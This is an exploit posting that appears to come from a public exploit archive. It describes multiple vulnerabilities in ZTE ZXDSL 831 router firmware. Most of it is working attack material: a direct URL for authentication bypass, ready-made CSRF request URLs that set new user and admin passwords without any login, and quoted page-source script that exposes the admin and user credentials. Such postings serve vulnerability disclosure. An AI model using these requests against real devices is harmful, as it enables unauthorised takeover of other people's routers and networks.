# Exploit Title: ZTE ZXDSL 831IIV7.5.0a_Z29_OV Multiple vulnerabilities
# Date: 28 / 10 / 2011 .
# Authors: Mehdi Boukazoula ; Ibrahim Debeche .
# Software Link with patch : 
# Version: v 831IIV7.5.0a_Z29_OV
# Tested on: v 831IIV7.5.0a_Z29_OV, May Affect all ZTE routers !!
# Description :

1 - Authentication bypass + Cross Site Request forgery
To bypass authentication go to URL : http://192.168.1.1/accessaccount.cgi
To get request forgery; The attacker can request from his browser without cookie or any authentication, or send link to the Administrator :
 
USER ACCOUNT : http://192.168.1.1/accessaccount.cgi?usrUserName=user&usrPassword=111111
ADMIN ACCOUNT : http://192.168.1.1/accessaccount.cgi?sysUserName=admin&sysPassword=111111

2 - Script revealing sensitive information on source of page "accessaccount.cgi":

function frmLoad()
{
   with ( document.forms.adminaccount ) {
      sysUserName.value = 'admin';
      sysPassword.value = '43210';
      syscfmPwd.value = '43210';
      
      usrUserName.value = 'user';
      usrPassword.value = '111111';
      usrcfmPwd.value = '111111';
   }
}